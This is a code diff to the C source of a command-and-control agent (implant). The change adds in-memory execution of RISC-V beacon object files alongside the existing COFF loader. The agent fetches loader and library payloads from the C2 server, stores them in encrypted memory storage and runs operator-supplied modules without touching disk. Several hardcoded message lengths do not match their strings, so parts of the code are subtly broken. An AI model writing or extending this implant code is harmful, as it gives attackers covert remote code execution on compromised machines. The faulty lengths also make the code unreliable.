@@ -28,10 +28,18 @@
 #ifndef C2_AGENT_ENABLE_BOF
 #define C2_AGENT_ENABLE_BOF 1
 #endif
+#ifndef C2_AGENT_ENABLE_RVVM
+#define C2_AGENT_ENABLE_RVVM 1
+#endif
 
-#if C2_AGENT_ENABLE_BOF
+#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
 #include "bof.h"
+#endif
+#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
 #include "module.h"
+#endif
+#if C2_AGENT_ENABLE_RVVM
+#include "rvvm.h"
 #endif
 #include "embedded_config.h"
 #include "gzip.h"
@@ -449,12 +457,7 @@ static void run_download(c2_agent_session *s, c2_memfile *mem, const char *name,
               st == C2_OK ? 11 : 16);
 }
 
-#if C2_AGENT_ENABLE_BOF
-/* BOF loader dependency name, cached in memfs and fetched from the C2 on the
- * www route as <name>.<arch>.gz when absent (the Linux analogue of the Windows
- * COFFLoader DLL dependency). */
-#define C2_BOF_LOADER_KEY "memfs:///coffloader_linux.so"
-
+#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
 static const char *c2_arch_name(void) {
   struct utsname un;
   memset(&un, 0, sizeof(un));
@@ -471,26 +474,44 @@ static const char *c2_arch_name(void) {
   return "amd64";
 }
 
-/* Ensure coffloader_linux.so is in memfs, downloading the hosted .gz if needed.
+/* Memfs key of an in-memory dependency image: memfs:///<module>.so. */
+static int dependency_key(const char *module, char *key, size_t cap) {
+  int n = snprintf(key, cap, "memfs:///%s.so", module);
+  return (n < 0 || (size_t)n >= cap) ? -1 : n;
+}
+
+/*
+ * Ensure an in-memory dependency module is resident in memfs, downloading the
+ * C2-hosted <module>.<arch>.gz on first use. This is the Linux analogue of the
+ * Windows COFFLoader DLL dependency and is shared by every dependency the
+ * agent maps itself (the BOF loader and the RV32 interpreter).
  */
-static c2_status ensure_bof_loader(c2_agent_session *s, c2_memfile *mem) {
+static c2_status ensure_dependency(c2_agent_session *s, c2_memfile *mem,
+                                   const char *module) {
+  char key[128];
+  int key_len = dependency_key(module, key, sizeof(key));
+  if (key_len < 0)
+    return C2_ERR_NOMEM;
+
   uint8_t *probe = NULL;
   size_t probe_len = 0;
-  if (c2_memfile_read_alloc(mem, c2_str_lit(C2_BOF_LOADER_KEY), &probe,
+  if (c2_memfile_read_alloc(mem, c2_str_of(key, (size_t)key_len), &probe,
                             &probe_len) == C2_OK) {
     free(probe);
     return C2_OK;
   }
 
   char name[96];
-  snprintf(name, sizeof(name), "coffloader_linux.%s.gz", c2_arch_name());
+  int n = snprintf(name, sizeof(name), "%s.%s.gz", module, c2_arch_name());
+  if (n < 0 || (size_t)n >= sizeof(name))
+    return C2_ERR_NOMEM;
   size_t gz_cap = 8u * 1024u * 1024u;
   uint8_t *gz = (uint8_t *)malloc(gz_cap);
   if (gz == NULL)
     return C2_ERR_NOMEM;
   size_t gz_len = 0;
-  c2_status st = c2_session_download(s, c2_str_of(name, strlen(name)), gz,
-                                     gz_cap, &gz_len);
+  c2_status st =
+      c2_session_download(s, c2_str_of(name, (size_t)n), gz, gz_cap, &gz_len);
   if (st != C2_OK) {
     free(gz);
     return st;
@@ -506,26 +527,37 @@ static c2_status ensure_bof_loader(c2_agent_session *s, c2_memfile *mem) {
   st = c2_gzip_decompress(gz, gz_len, so, so_cap, &so_len);
   free(gz);
   if (st == C2_OK)
-    st = c2_memfile_write(mem, c2_str_lit(C2_BOF_LOADER_KEY), so, so_len);
+    st = c2_memfile_write(mem, c2_str_of(key, (size_t)key_len), so, so_len);
   free(so);
   return st;
 }
 
+/* Read a dependency image that ensure_dependency() put in memfs. */
+static c2_status load_dependency(c2_memfile *mem, const char *module,
+                                 uint8_t **img, size_t *len) {
+  char key[128];
+  int key_len = dependency_key(module, key, sizeof(key));
+  if (key_len < 0)
+    return C2_ERR_NOMEM;
+  return c2_memfile_read_alloc(mem, c2_str_of(key, (size_t)key_len), img, len);
+}
+#endif
+
+#if C2_AGENT_ENABLE_BOF
 /* Run one BOF object already in memory through the coffloader_linux
  * dependency. `tokens` are the packed-arg tokens c2_bof_pack_args consumes. */
 static void execute_bof(c2_agent_session *s, c2_memfile *mem,
                         const uint8_t *bof, size_t bof_len,
                         const char *export_name, const c2_str *tokens,
                         size_t tokenc, obuf *out) {
-  if (ensure_bof_loader(s, mem) != C2_OK) {
-    obuf_append(out, "bof: coffloader_linux unavailable\n", 31);
+  if (ensure_dependency(s, mem, "coffloader_linux") != C2_OK) {
+    obuf_append(out, "bof: coffloader_linux unavailable\n", 34);
     return;
   }
   uint8_t *loader = NULL;
   size_t loader_len = 0;
-  if (c2_memfile_read_alloc(mem, c2_str_lit(C2_BOF_LOADER_KEY), &loader,
-                            &loader_len) != C2_OK) {
-    obuf_append(out, "bof: coffloader_linux unavailable\n", 31);
+  if (load_dependency(mem, "coffloader_linux", &loader, &loader_len) != C2_OK) {
+    obuf_append(out, "bof: coffloader_linux unavailable\n", 34);
     return;
   }
 
@@ -602,11 +634,107 @@ static void run_bof(c2_agent_session *s, c2_memfile *mem,
   free(bof);
 }
 
+#endif /* C2_AGENT_ENABLE_BOF */
+
+#if C2_AGENT_ENABLE_RVVM
+/* Fetch a module companion into memfs and return its plaintext bytes. The
+ * file is verified, decompressed and stored in encrypted memfs. */
+static c2_status fetch_companion(c2_agent_session *s, c2_memfile *mem,
+                                 const c2_module_file *f, uint8_t **out,
+                                 size_t *out_len) {
+  size_t gz_cap = 32u * 1024u * 1024u;
+  uint8_t *gz = (uint8_t *)malloc(gz_cap);
+  if (gz == NULL)
+    return C2_ERR_NOMEM;
+  size_t gz_len = 0;
+  c2_status st = c2_session_download(s, c2_str_of(f->name, strlen(f->name)), gz,
+                                     gz_cap, &gz_len);
+  if (st != C2_OK) {
+    free(gz);
+    return st;
+  }
+  if (f->checksum[0] != '\0') {
+    uint8_t digest[C2_SHA256_BYTES];
+    if (s->be->sha256 == NULL ||
+        s->be->sha256(s->be->ctx, gz, gz_len, digest) != 0) {
+      free(gz);
+      return C2_ERR_IO;
+    }
+    char hex[C2_SHA256_BYTES * 2 + 1];
+    c2_hex_encode(digest, sizeof(digest), hex);
+    hex[C2_SHA256_BYTES * 2] = '\0';
+    if (!c2_str_eq_ci(hex, f->checksum)) {
+      free(gz);
+      return C2_ERR_PROTO;
+    }
+  }
+  uint8_t *lib = (uint8_t *)malloc(gz_cap);
+  if (lib == NULL) {
+    free(gz);
+    return C2_ERR_NOMEM;
+  }
+  size_t lib_len = 0;
+  st = c2_gzip_decompress(gz, gz_len, lib, gz_cap, &lib_len);
+  free(gz);
+  if (st != C2_OK) {
+    free(lib);
+    return st;
+  }
+  char key[512];
+  size_t kl = c2_memfile_key(f->name, strlen(f->name), key, sizeof(key));
+  if (kl == 0) {
+    free(lib);
+    return C2_ERR_NOMEM;
+  }
+  st = c2_memfile_write(mem, c2_str_of(key, kl), lib, lib_len);
+  free(lib);
+  if (st != C2_OK)
+    return st;
+  return c2_memfile_read_alloc(mem, c2_str_of(key, kl), out, out_len);
+}
+
+/* Run one RV32 BOF object already in memory through the rvvm_linux
+ * dependency. `entry` is the export ("" means "go") and `bof_args` is the
+ * packed COFF argument buffer. */
+static void execute_rv(c2_agent_session *s, c2_memfile *mem,
+                       const uint8_t *image, size_t image_len,
+                       const char *entry, const uint8_t *bof_args,
+                       size_t bof_len, const c2_rv_lib *libs, size_t nlibs,
+                       obuf *out) {
+  if (ensure_dependency(s, mem, "rvvm_linux") != C2_OK) {
+    obuf_append(out, "rv: rvvm_linux unavailable\n", 27);
+    return;
+  }
+  uint8_t *loader = NULL;
+  size_t loader_len = 0;
+  if (load_dependency(mem, "rvvm_linux", &loader, &loader_len) != C2_OK) {
+    obuf_append(out, "rv: rvvm_linux unavailable\n", 27);
+    return;
+  }
+
+  char *result = NULL;
+  c2_status st = c2_rv_run(loader, loader_len, image, image_len, entry,
+                           bof_args, bof_len, libs, nlibs, &result);
+  if (st == C2_OK && result != NULL) {
+    obuf_append(out, result, strlen(result));
+    free(result);
+  } else if (result != NULL) {
+    obuf_append(out, "rv: ", 4);
+    obuf_append(out, result, strlen(result));
+    obuf_append(out, "\n", 1);
+    free(result);
+  } else if (st != C2_OK) {
+    obuf_append(out, "rv: run failed\n", 15);
+  }
+  free(loader);
+}
+#endif /* C2_AGENT_ENABLE_RVVM */
+
+#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
 /* `!custom_module --mod_name X --type coff --file_to_download Y.gz
  *  --checksum <sha256> --invocation <base64 CBOR>`: the C2's module dispatch.
  * Download + verify + decompress the payload, decode the invocation, run the
- * BOF. This is the path the operator's `hello_linux` (and any Linux BOF module)
- * takes, mirroring the Go agent's ModuleHandler for `coff`. */
+ * payload in memory. */
 static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
                               const c2_str_list *cmd, obuf *out) {
   char mod_name[128] = "";
@@ -626,7 +754,16 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
   }
   c2_cmd_pick_flag(cmd, "--invocation", invocation, inv_cap);
 
-  if (!c2_str_eq_ci(type, "coff")) {
+  int supported = 0;
+#if C2_AGENT_ENABLE_BOF
+  if (c2_str_eq_ci(type, "coff"))
+    supported = 1;
+#endif
+#if C2_AGENT_ENABLE_RVVM
+  if (c2_str_eq_ci(type, "rv"))
+    supported = 1;
+#endif
+  if (!supported) {
     obuf_append(out, "custom_module: unsupported module type\n", 37);
     free(invocation);
     return;
@@ -675,7 +812,7 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
     }
   }
 
-  size_t obj_cap = 16u * 1024u * 1024u;
+  size_t obj_cap = 64u * 1024u * 1024u;
   uint8_t *obj = (uint8_t *)malloc(obj_cap);
   if (obj == NULL) {
     obuf_append(out, "custom_module: out of memory\n", 28);
@@ -693,7 +830,7 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
     return;
   }
 
-  size_t tokbuf_cap = 256u * 1024u;
+  size_t tokbuf_cap = 64u * 1024u;
   char *tokbuf = (char *)malloc(tokbuf_cap);
   if (tokbuf == NULL) {
     obuf_append(out, "custom_module: out of memory\n", 28);
@@ -701,27 +838,119 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
     free(invocation);
     return;
   }
-  char export_name[64] = "go";
-  c2_str tokens[64];
-  size_t tokenc = 0;
-  size_t tokbuf_used = 0;
-  st = c2_coff_invocation_parse(invocation, strlen(invocation), export_name,
-                                sizeof(export_name), tokens, &tokenc,
-                                sizeof(tokens) / sizeof(tokens[0]), tokbuf,
-                                tokbuf_cap, &tokbuf_used);
-  free(invocation);
-  if (st != C2_OK) {
-    obuf_append(out, "custom_module: bad invocation\n", 29);
+
+#if C2_AGENT_ENABLE_RVVM
+  if (c2_str_eq_ci(type, "rv")) {
+    /* An rv payload is a portable BOF: an RV32 relocatable object that the
+     * interpreter relocates against its embedded runtime. */
+    char export_name[64] = "";
+    c2_str tokens[64];
+    size_t tokenc = 0;
+    size_t tokbuf_used = 0;
+    st = c2_coff_invocation_parse(invocation, strlen(invocation), export_name,
+                                  sizeof(export_name), tokens, &tokenc,
+                                  sizeof(tokens) / sizeof(tokens[0]), tokbuf,
+                                  tokbuf_cap, &tokbuf_used);
+    c2_module_file mfiles[C2_MODULE_FILE_MAX];
+    size_t nmfiles = 0;
+    if (st == C2_OK)
+      st = c2_module_files_parse(invocation, strlen(invocation), mfiles,
+                                 &nmfiles);
+    free(invocation);
+    if (st != C2_OK || export_name[0] == '\0') {
+      obuf_append(out, "custom_module: rv module has no coff_export\n", 45);
+      free(tokbuf);
+      free(obj);
+      return;
+    }
+
+    size_t packed_cap = 4;
+    for (size_t i = 0; i < tokenc; i++)
+      packed_cap += 8 + tokens[i].len * 4;
+    uint8_t *packed = (uint8_t *)malloc(packed_cap);
+    size_t packed_len = 0;
+    if (packed == NULL) {
+      st = C2_ERR_NOMEM;
+    } else if (tokenc > 0) {
+      st = c2_bof_pack_args(tokens, tokenc, packed, packed_cap, &packed_len);
+    } else {
+      memset(packed, 0, 4);
+      packed_len = 4;
+    }
+    if (st != C2_OK) {
+      obuf_append(out, "custom_module: bad invocation\n", 29);
+      free(packed);
+      free(tokbuf);
+      free(obj);
+      return;
+    }
+    /* Companion files are RISC-V libraries delivered with the module. They
+     * are fetched into encrypted memfs and passed as in-memory images. */
+    c2_rv_lib libs[C2_MODULE_FILE_MAX];
+    uint8_t *libbufs[C2_MODULE_FILE_MAX] = {0};
+    size_t nlibs = 0;
+    for (size_t i = 0; i < nmfiles; i++) {
+      uint8_t *lb = NULL;
+      size_t ll = 0;
+      st = fetch_companion(s, mem, &mfiles[i], &lb, &ll);
+      if (st != C2_OK) {
+        obuf_append(out, "custom_module: library fetch failed\n", 37);
+        for (size_t k = 0; k < nlibs; k++)
+          free(libbufs[k]);
+        free(packed);
+        free(tokbuf);
+        free(obj);
+        return;
+      }
+      libbufs[nlibs] = lb;
+      libs[nlibs].buf = lb;
+      libs[nlibs].len = ll;
+      nlibs++;
+    }
+    TRACE("[agent] custom_module %s: rv BOF %zu args export=%s libs=%zu\n",
+          mod_name, tokenc, export_name, nlibs);
+    execute_rv(s, mem, obj, obj_len, export_name, packed, packed_len, libs,
+               nlibs, out);
+    for (size_t i = 0; i < nlibs; i++)
+      free(libbufs[i]);
+    free(packed);
     free(tokbuf);
     free(obj);
     return;
   }
+#endif
 
-  TRACE("[agent] custom_module %s: %zu args export=%s\n", mod_name, tokenc,
-        export_name);
-  execute_bof(s, mem, obj, obj_len, export_name, tokens, tokenc, out);
+#if C2_AGENT_ENABLE_BOF
+  if (c2_str_eq_ci(type, "coff")) {
+    char export_name[64] = "go";
+    c2_str tokens[64];
+    size_t tokenc = 0;
+    size_t tokbuf_used = 0;
+    st = c2_coff_invocation_parse(invocation, strlen(invocation), export_name,
+                                  sizeof(export_name), tokens, &tokenc,
+                                  sizeof(tokens) / sizeof(tokens[0]), tokbuf,
+                                  tokbuf_cap, &tokbuf_used);
+    free(invocation);
+    if (st != C2_OK) {
+      obuf_append(out, "custom_module: bad invocation\n", 29);
+      free(tokbuf);
+      free(obj);
+      return;
+    }
+    TRACE("[agent] custom_module %s: %zu args export=%s\n", mod_name, tokenc,
+          export_name);
+    execute_bof(s, mem, obj, obj_len, export_name, tokens, tokenc, out);
+    free(tokbuf);
+    free(obj);
+    return;
+  }
+#endif
+
+  /* Unreachable: the type was validated above. */
+  free(invocation);
   free(tokbuf);
   free(obj);
+  obuf_append(out, "custom_module: unsupported module type\n", 37);
 }
 
 #endif
@@ -790,9 +1019,11 @@ static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
     run_mem_ls(mem, out);
   } else if (cmd_eq(name, "download")) {
     run_download(s, mem, arg, out);
-#if C2_AGENT_ENABLE_BOF
+#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
   } else if (cmd_eq(name, "custom_module")) {
     run_custom_module(s, mem, &m->cmd_slice, out);
+#endif
+#if C2_AGENT_ENABLE_BOF
   } else if (cmd_eq(name, "bof")) {
     run_bof(s, mem, &m->cmd_slice, out);
 #endif
